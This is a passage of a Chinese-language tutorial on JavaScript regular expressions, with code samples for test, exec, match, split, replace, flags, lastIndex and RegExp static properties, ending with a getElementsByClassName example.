class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\d/;</span><br><span class="line">var string = &quot;abc123&quot;;</span><br><span class="line">console.log( !!string.match(regex) );</span><br><span class="line">// =&gt; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><ul><li>使用<code>exec</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\d/;</span><br><span class="line">var string = &quot;abc123&quot;;</span><br><span class="line">console.log( !!regex.exec(string) );</span><br><span class="line">// =&gt; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中，最常用的是<code>test</code>。</p><p><strong>1.2 切分</strong></p><p>匹配上了，我们就可以进行一些操作，比如切分。</p><p>所谓“切分”，就是把目标字符串，切成一段一段的。在JS中使用的是<code>split</code>。</p><p>比如，目标字符串是”html,css,javascript”，按逗号来切分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /,/;</span><br><span class="line">var string = &quot;html,css,javascript&quot;;</span><br><span class="line">console.log( string.split(regex) );</span><br><span class="line">// =&gt; [&quot;html&quot;, &quot;css&quot;, &quot;javascript&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>又比如，如下的日期格式：</p><blockquote><p>2017/06/26</p><p>2017.06.26</p><p>2017-06-26</p></blockquote><p>可以使用<code>split</code>“切出”年月日：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\D/;</span><br><span class="line">console.log( &quot;2017/06/26&quot;.split(regex) );</span><br><span class="line">console.log( &quot;2017.06.26&quot;.split(regex) );</span><br><span class="line">console.log( &quot;2017-06-26&quot;.split(regex) );</span><br><span class="line">// =&gt; [&quot;2017&quot;, &quot;06&quot;, &quot;26&quot;]</span><br><span class="line">// =&gt; [&quot;2017&quot;, &quot;06&quot;, &quot;26&quot;]</span><br><span class="line">// =&gt; [&quot;2017&quot;, &quot;06&quot;, &quot;26&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>1.3 提取</strong></p><p>虽然整体匹配上了，但有时需要提取部分匹配的数据。</p><p>此时正则通常要使用分组引用（分组捕获）功能，还需要配合使用相关API。</p><p>这里，还是以日期为例，提取出年月日。注意下面正则中的括号：</p><ul><li><code>match</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /^(\d&#123;4&#125;)\D(\d&#123;2&#125;)\D(\d&#123;2&#125;)$/;</span><br><span class="line">var string = &quot;2017-06-26&quot;;</span><br><span class="line">console.log( string.match(regex) );</span><br><span class="line">// =&gt;[&quot;2017-06-26&quot;, &quot;2017&quot;, &quot;06&quot;, &quot;26&quot;, index: 0, input: &quot;2017-06-26&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><ul><li><code>exec</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /^(\d&#123;4&#125;)\D(\d&#123;2&#125;)\D(\d&#123;2&#125;)$/;</span><br><span class="line">var string = &quot;2017-06-26&quot;;</span><br><span class="line">console.log( regex.exec(string) );</span><br><span class="line">// =&gt;[&quot;2017-06-26&quot;, &quot;2017&quot;, &quot;06&quot;, &quot;26&quot;, index: 0, input: &quot;2017-06-26&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><ul><li><code>test</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var regex = /^(\d&#123;4&#125;)\D(\d&#123;2&#125;)\D(\d&#123;2&#125;)$/;</span><br><span class="line">var string = &quot;2017-06-26&quot;;</span><br><span class="line">regex.test(string);</span><br><span class="line">console.log( RegExp.$1, RegExp.$2, RegExp.$3 );</span><br><span class="line">// =&gt; &quot;2017&quot; &quot;06&quot; &quot;26&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><ul><li><code>search</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var regex = /^(\d&#123;4&#125;)\D(\d&#123;2&#125;)\D(\d&#123;2&#125;)$/;</span><br><span class="line">var string = &quot;2017-06-26&quot;;</span><br><span class="line">string.search(regex);</span><br><span class="line">console.log( RegExp.$1, RegExp.$2, RegExp.$3 );</span><br><span class="line">// =&gt; &quot;2017&quot; &quot;06&quot; &quot;26&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><ul><li><code>replace</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var regex = /^(\d&#123;4&#125;)\D(\d&#123;2&#125;)\D(\d&#123;2&#125;)$/;</span><br><span class="line">var string = &quot;2017-06-26&quot;;</span><br><span class="line">var date = [];</span><br><span class="line">string.replace(regex, function(match, year, month, day) &#123;</span><br><span class="line">date.push(year, month, day);</span><br><span class="line">&#125;);</span><br><span class="line">console.log(date);</span><br><span class="line">// =&gt; [&quot;2017&quot;, &quot;06&quot;, &quot;26&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中，最常用的是<code>match</code>。</p><p><strong>1.4 替换</strong></p><p>找，往往不是目的，通常下一步是为了替换。在JS中，使用<code>replace</code>进行替换。</p><p>比如把日期格式，从yyyy-mm-dd替换成yyyy/mm/dd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;2017-06-26&quot;;</span><br><span class="line">var today = new Date( string.replace(/-/g, &quot;/&quot;) );</span><br><span class="line">console.log( today );</span><br><span class="line">// =&gt; Mon Jun 26 2017 00:00:00 GMT+0800 (中国标准时间)</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>这里只是简单地应用了一下<code>replace</code>。但，<code>replace</code>方法是强大的，是需要重点掌握的。</p><h3 id="2-相关API注意要点"><a href="#2-相关API注意要点" class="headerlink" title="2. 相关API注意要点"></a>2. 相关API注意要点</h3><p>从上面可以看出用于正则操作的方法，共有6个，字符串实例4个，正则实例2个：</p><blockquote><p>String#search</p><p>String#split</p><p>String#match</p><p>String#replace</p><p>RegExp#test</p><p>RegExp#exec</p></blockquote><p>本文不打算详细地讲解它们的方方面面细节，具体可以参考《JavaScript权威指南》的第三部分。本文重点列出一些容易忽视的地方，以飨读者。</p><p><strong>2.1 search和match的参数问题</strong></p><p>我们知道字符串实例的那4个方法参数都支持正则和字符串。</p><p>但<code>search</code>和<code>match</code>，会把字符串转换为正则的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;2017.06.27&quot;;</span><br><span class="line"></span><br><span class="line">console.log( string.search(&quot;.&quot;) );</span><br><span class="line">// =&gt; 0</span><br><span class="line">//需要修改成下列形式之一</span><br><span class="line">console.log( string.search(&quot;\\.&quot;) );</span><br><span class="line">console.log( string.search(/\./) );</span><br><span class="line">// =&gt; 4</span><br><span class="line">// =&gt; 4</span><br><span class="line"></span><br><span class="line">console.log( string.match(&quot;.&quot;) );</span><br><span class="line">// =&gt; [&quot;2&quot;, index: 0, input: &quot;2017.06.27&quot;]</span><br><span class="line">//需要修改成下列形式之一</span><br><span class="line">console.log( string.match(&quot;\\.&quot;) );</span><br><span class="line">console.log( string.match(/\./) );</span><br><span class="line">// =&gt; [&quot;.&quot;, index: 4, input: &quot;2017.06.27&quot;]</span><br><span class="line">// =&gt; [&quot;.&quot;, index: 4, input: &quot;2017.06.27&quot;]</span><br><span class="line"></span><br><span class="line">console.log( string.split(&quot;.&quot;) );</span><br><span class="line">// =&gt; [&quot;2017&quot;, &quot;06&quot;, &quot;27&quot;]</span><br><span class="line"></span><br><span class="line">console.log( string.replace(&quot;.&quot;, &quot;/&quot;) );</span><br><span class="line">// =&gt; &quot;2017/06.27&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.2 match返回结果的格式问题</strong></p><p><code>match</code>返回结果的格式，与正则对象是否有修饰符<code>g</code>有关。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;2017.06.27&quot;;</span><br><span class="line">var regex1 = /\b(\d+)\b/;</span><br><span class="line">var regex2 = /\b(\d+)\b/g;</span><br><span class="line">console.log( string.match(regex1) );</span><br><span class="line">console.log( string.match(regex2) );</span><br><span class="line">// =&gt; [&quot;2017&quot;, &quot;2017&quot;, index: 0, input: &quot;2017.06.27&quot;]</span><br><span class="line">// =&gt; [&quot;2017&quot;, &quot;06&quot;, &quot;27&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>没有<code>g</code>，返回的是标准匹配格式，即，数组的第一个元素是整体匹配的内容，接下来是分组捕获的内容，然后是整体匹配的第一个下标，最后是输入的目标字符串。</p><p>有<code>g</code>，返回的是所有匹配的内容。</p><p>当没有匹配时，不管有无<code>g</code>，都返回<code>null</code>。</p><p><strong>2.3 exec比match更强大</strong></p><p>当正则没有<code>g</code>时，使用<code>match</code>返回的信息比较多。但是有<code>g</code>后，就没有关键的信息<code>index</code>了。</p><p>而<code>exec</code>方法就能解决这个问题，它能接着上一次匹配后继续匹配：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;2017.06.27&quot;;</span><br><span class="line">var regex2 = /\b(\d+)\b/g;</span><br><span class="line">console.log( regex2.exec(string) );</span><br><span class="line">console.log( regex2.lastIndex);</span><br><span class="line">console.log( regex2.exec(string) );</span><br><span class="line">console.log( regex2.lastIndex);</span><br><span class="line">console.log( regex2.exec(string) );</span><br><span class="line">console.log( regex2.lastIndex);</span><br><span class="line">console.log( regex2.exec(string) );</span><br><span class="line">console.log( regex2.lastIndex);</span><br><span class="line">// =&gt; [&quot;2017&quot;, &quot;2017&quot;, index: 0, input: &quot;2017.06.27&quot;]</span><br><span class="line">// =&gt; 4</span><br><span class="line">// =&gt; [&quot;06&quot;, &quot;06&quot;, index: 5, input: &quot;2017.06.27&quot;]</span><br><span class="line">// =&gt; 7</span><br><span class="line">// =&gt; [&quot;27&quot;, &quot;27&quot;, index: 8, input: &quot;2017.06.27&quot;]</span><br><span class="line">// =&gt; 10</span><br><span class="line">// =&gt; null</span><br><span class="line">// =&gt; 0</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中正则实例<code>lastIndex</code>属性，表示下一次匹配开始的位置。</p><p>比如第一次匹配了“2017”，开始下标是0，共4个字符，因此这次匹配结束的位置是3，下一次开始匹配的位置是4。</p><p>从上述代码看出，在使用<code>exec</code>时，经常需要配合使用<code>while</code>循环：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;2017.06.27&quot;;</span><br><span class="line">var regex2 = /\b(\d+)\b/g;</span><br><span class="line">var result;</span><br><span class="line">while ( result = regex2.exec(string) ) &#123;</span><br><span class="line">console.log( result, regex2.lastIndex );</span><br><span class="line">&#125;</span><br><span class="line">// =&gt; [&quot;2017&quot;, &quot;2017&quot;, index: 0, input: &quot;2017.06.27&quot;] 4</span><br><span class="line">// =&gt; [&quot;06&quot;, &quot;06&quot;, index: 5, input: &quot;2017.06.27&quot;] 7</span><br><span class="line">// =&gt; [&quot;27&quot;, &quot;27&quot;, index: 8, input: &quot;2017.06.27&quot;] 10</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.4 修饰符g，对exex和test的影响</strong></p><p>上面提到了正则实例的<code>lastIndex</code>属性，表示尝试匹配时，从字符串的<code>lastIndex</code>位开始去匹配。</p><p>字符串的四个方法，每次匹配时，都是从0开始的，即<code>lastIndex</code>属性始终不变。</p><p>而正则实例的两个方法<code>exec</code>、<code>test</code>，当正则是全局匹配时，每一次匹配完成后，都会修改<code>lastIndex</code>。下面让我们以<code>test</code>为例，看看你是否会迷糊：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var regex = /a/g;</span><br><span class="line">console.log( regex.test(&quot;a&quot;), regex.lastIndex );</span><br><span class="line">console.log( regex.test(&quot;aba&quot;), regex.lastIndex );</span><br><span class="line">console.log( regex.test(&quot;ababc&quot;), regex.lastIndex );</span><br><span class="line">// =&gt; true 1</span><br><span class="line">// =&gt; true 3</span><br><span class="line">// =&gt; false 0</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>注意上面代码中的第三次调用<code>test</code>，因为这一次尝试匹配，开始从下标<code>lastIndex</code>即3位置处开始查找，自然就找不到了。</p><p>如果没有<code>g</code>，自然都是从字符串第0个字符处开始尝试匹配：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var regex = /a/;</span><br><span class="line">console.log( regex.test(&quot;a&quot;), regex.lastIndex );</span><br><span class="line">console.log( regex.test(&quot;aba&quot;), regex.lastIndex );</span><br><span class="line">console.log( regex.test(&quot;ababc&quot;), regex.lastIndex );</span><br><span class="line">// =&gt; true 0</span><br><span class="line">// =&gt; true 0</span><br><span class="line">// =&gt; true 0</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.5 test整体匹配时需要使用^和$</strong></p><p>这个相对容易理解，因为<code>test</code>是看目标字符串中是否有子串匹配正则，即有部分匹配即可。</p><p>如果，要整体匹配，正则前后需要添加开头和结尾：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">console.log( /123/.test(&quot;a123b&quot;) );</span><br><span class="line">// =&gt; true</span><br><span class="line">console.log( /^123$/.test(&quot;a123b&quot;) );</span><br><span class="line">// =&gt; false</span><br><span class="line">console.log( /^123$/.test(&quot;123&quot;) );</span><br><span class="line">// =&gt; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.6 split相关注意事项</strong></p><p><code>split</code>方法看起来不起眼，但要注意的地方有两个的。</p><p>第一，它可以有第二个参数，表示结果数组的最大长度：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;html,css,javascript&quot;;</span><br><span class="line">console.log( string.split(/,/, 2) );</span><br><span class="line">// =&gt;[&quot;html&quot;, &quot;css&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>第二，正则使用分组时，结果数组中是包含分隔符的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;html,css,javascript&quot;;</span><br><span class="line">console.log( string.split(/(,)/) );</span><br><span class="line">// =&gt;[&quot;html&quot;, &quot;,&quot;, &quot;css&quot;, &quot;,&quot;, &quot;javascript&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.7 replace是很强大的</strong></p><p>《JavaScript权威指南》认为<code>exec</code>是这6个API中最强大的，而我始终认为<code>replace</code>才是最强大的。因为它也能拿到该拿到的信息，然后可以假借替换之名，做些其他事情。</p><p>总体来说<code>replace</code>有两种使用形式，这是因为它的第二个参数，可以是字符串，也可以是函数。</p><p>当第二个参数是字符串时，如下的字符有特殊的含义：</p><blockquote><p><code>$1</code>,<code>$2</code>,…,<code>$99</code>匹配第1~99个分组里捕获的文本<br><code>$&amp;</code> 匹配到的子串文本<br><code>$`</code> 匹配到的子串的左边文本<br><code>$&#39;</code> 匹配到的子串的右边文本<br><code>$$</code> 美元符号</p></blockquote><p>例如，把”2,3,5”，变成”5=2+3”：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result = &quot;2,3,5&quot;.replace(/(\d+),(\d+),(\d+)/, &quot;$3=$1+$2&quot;);</span><br><span class="line">console.log(result);</span><br><span class="line">// =&gt; &quot;5=2+3&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>又例如，把”2,3,5”，变成”222,333,555”:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result = &quot;2,3,5&quot;.replace(/(\d+)/g, &quot;$&amp;$&amp;$&amp;&quot;);</span><br><span class="line">console.log(result);</span><br><span class="line">// =&gt; &quot;222,333,555&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>再例如，把”2+3=5”，变成”2+3=2+3=5=5”:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result = &quot;2+3=5&quot;.replace(/=/, &quot;$&amp;$`$&amp;$&apos;$&amp;&quot;);</span><br><span class="line">console.log(result);</span><br><span class="line">// =&gt; &quot;2+3=2+3=5=5&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>当第二个参数是函数时，我们需要注意该回调函数的参数具体是什么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;1234 2345 3456&quot;.replace(/(\d)\d&#123;2&#125;(\d)/g, function(match, $1, $2, index, input) &#123;</span><br><span class="line">console.log([match, $1, $2, index, input]);</span><br><span class="line">&#125;);</span><br><span class="line">// =&gt; [&quot;1234&quot;, &quot;1&quot;, &quot;4&quot;, 0, &quot;1234 2345 3456&quot;]</span><br><span class="line">// =&gt; [&quot;2345&quot;, &quot;2&quot;, &quot;5&quot;, 5, &quot;1234 2345 3456&quot;]</span><br><span class="line">// =&gt; [&quot;3456&quot;, &quot;3&quot;, &quot;6&quot;, 10, &quot;1234 2345 3456&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>此时我们可以看到<code>replace</code>拿到的信息，并不比<code>exec</code>少。</p><p><strong>2.8 使用构造函数需要注意的问题</strong></p><p>一般不推荐使用构造函数生成正则，而应该优先使用字面量。因为用构造函数会多写很多<code>\</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;2017-06-27 2017.06.27 2017/06/27&quot;;</span><br><span class="line">var regex = /\d&#123;4&#125;(-|\.|\/)\d&#123;2&#125;\1\d&#123;2&#125;/g;</span><br><span class="line">console.log( string.match(regex) );</span><br><span class="line">// =&gt; [&quot;2017-06-27&quot;, &quot;2017.06.27&quot;, &quot;2017/06/27&quot;]</span><br><span class="line"></span><br><span class="line">regex = new RegExp(&quot;\\d&#123;4&#125;(-|\\.|\\/)\\d&#123;2&#125;\\1\\d&#123;2&#125;&quot;, &quot;g&quot;);</span><br><span class="line">console.log( string.match(regex) );</span><br><span class="line">// =&gt; [&quot;2017-06-27&quot;, &quot;2017.06.27&quot;, &quot;2017/06/27&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.9 修饰符</strong></p><p>ES5中修饰符，共3个：</p><blockquote><p><code>g</code> 全局匹配，即找到所有匹配的，单词是global</p><p><code>i</code> 忽略字母大小写，单词ingoreCase</p><p><code>m</code> 多行匹配，只影响<code>^</code>和<code>$</code>，二者变成行的概念，即行开头和行结尾。单词是multiline</p></blockquote><p>当然正则对象也有相应的只读属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\w/img;</span><br><span class="line">console.log( regex.global );</span><br><span class="line">console.log( regex.ignoreCase );</span><br><span class="line">console.log( regex.multiline );</span><br><span class="line">// =&gt; true</span><br><span class="line">// =&gt; true</span><br><span class="line">// =&gt; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.10 source属性</strong></p><p>正则实例对象属性，除了<code>global</code>、<code>ingnoreCase</code>、<code>multiline</code>、<code>lastIndex</code>属性之外，还有一个<code>source</code>属性。</p><p>它什么时候有用呢？</p><p>比如，在构建动态的正则表达式时，可以通过查看该属性，来确认构建出的正则到底是什么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var className = &quot;high&quot;;</span><br><span class="line">var regex = new RegExp(&quot;(^|\\s)&quot; + className + &quot;(\\s|$)&quot;);</span><br><span class="line">console.log( regex.source )</span><br><span class="line">// =&gt; (^|\s)high(\s|$) 即字符串&quot;(^|\\s)high(\\s|$)&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.11 构造函数属性</strong></p><p>构造函数的静态属性基于所执行的最近一次正则操作而变化。除了是<code>$1</code>,…,<code>$9</code>之外，还有几个不太常用的属性（有兼容性问题）：</p><blockquote><p><code>RegExp.input</code> 最近一次目标字符串，简写成<code>RegExp[&quot;$_&quot;]</code><br><code>RegExp.lastMatch</code> 最近一次匹配的文本，简写成<code>RegExp[&quot;$&amp;&quot;]</code><br><code>RegExp.lastParen</code> 最近一次捕获的文本，简写成<code>RegExp[&quot;$+&quot;]</code><br><code>RegExp.leftContext</code> 目标字符串中<code>lastMatch</code>之前的文本，简写成<code>RegExp[&quot;$</code>“]<code></code>RegExp.rightContext <code>目标字符串中</code>lastMatch<code>之后的文本，简写成</code>RegExp[“$’”]`</p></blockquote><p>测试代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var regex = /([abc])(\d)/g;</span><br><span class="line">var string = &quot;a1b2c3d4e5&quot;;</span><br><span class="line">string.match(regex);</span><br><span class="line"></span><br><span class="line">console.log( RegExp.input );</span><br><span class="line">console.log( RegExp[&quot;$_&quot;]);</span><br><span class="line">// =&gt; &quot;a1b2c3d4e5&quot;</span><br><span class="line"></span><br><span class="line">console.log( RegExp.lastMatch );</span><br><span class="line">console.log( RegExp[&quot;$&amp;&quot;] );</span><br><span class="line">// =&gt; &quot;c3&quot;</span><br><span class="line"></span><br><span class="line">console.log( RegExp.lastParen );</span><br><span class="line">console.log( RegExp[&quot;$+&quot;] );</span><br><span class="line">// =&gt; &quot;3&quot;</span><br><span class="line"></span><br><span class="line">console.log( RegExp.leftContext );</span><br><span class="line">console.log( RegExp[&quot;$`&quot;] );</span><br><span class="line">// =&gt; &quot;a1b2&quot;</span><br><span class="line"></span><br><span class="line">console.log( RegExp.rightContext );</span><br><span class="line">console.log( RegExp[&quot;$&apos;&quot;] );</span><br><span class="line">// =&gt; &quot;d4e5&quot;复制代码</span><br></pre></td></tr></table></figure><h3 id="3-真实案例"><a href="#3-真实案例" class="headerlink" title="3. 真实案例"></a>3. 真实案例</h3><p><strong>3.1 使用构造函数生成正则表达式</strong></p><p>我们知道要优先使用字面量来创建正则，但有时正则表达式的主体是不确定的，此时可以使用构造函数来创建。模拟<code>getElementsByClassName</code>方法，就是很能说明该问题的一个例子。</p><p>这里<code>getElementsByClassName</code>函数的实现思路是：</p><ul><li>比如要获取className为”high”的dom元素；</li><li>首先生成一个正则：<code>/(^|\s)high(\s|$)/</code>；</li><li>然后再用其逐一验证页面上的所有dom元素的类名，拿到满足匹配的元素即可。</li></ul><p>代码如下(可以直接复制到本地查看运行效果)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;p class=&quot;high&quot;&gt;1111&lt;/p&gt;</span><br><span class="line">&lt;p class=&quot;high&quot;&gt;2222&lt;/p&gt;</span><br><span class="line">&lt;p&gt;3333&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function getElementsByClassName(className) &#123;</span><br><span class="line">var elements = document.getElementsByTagName(&quot;*&quot;);</span><br><span class="line">var regex = new RegExp(&quot;(^|\\s)&quot; + className + &quot;(\\s|$)&quot;);</span><br><span class="line">var result = [];</span><br><span class="line">for (var i = 0; i &lt; elements.length; i++) &#123;</span><br><span class="line">var element = elements[i];</span><br><span class="line">if (regex.test(element.className)) &#123;</span><br><span class="line">result.push(element)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br><span class="line">&#125;</span><br><span class="line">var highs = getElementsByClassName(&apos;high&apos;);</span><br><span class="line">highs.forEach(function(item) &#123;</span><br><span class="line">item.style.color = &apos;red&apos;;</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>3.2 使用字符串保存数据</strong></p><p>一般情况下，我们都愿意使用数组来保存数据。但我看到有的框架中，使用的却是字符串。</p><p>使用时，仍需要把字符串切分成数组。虽然不一定用到正则，但总感觉酷酷的，这里分享如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var utils = &#123;&#125;;</span><br><span 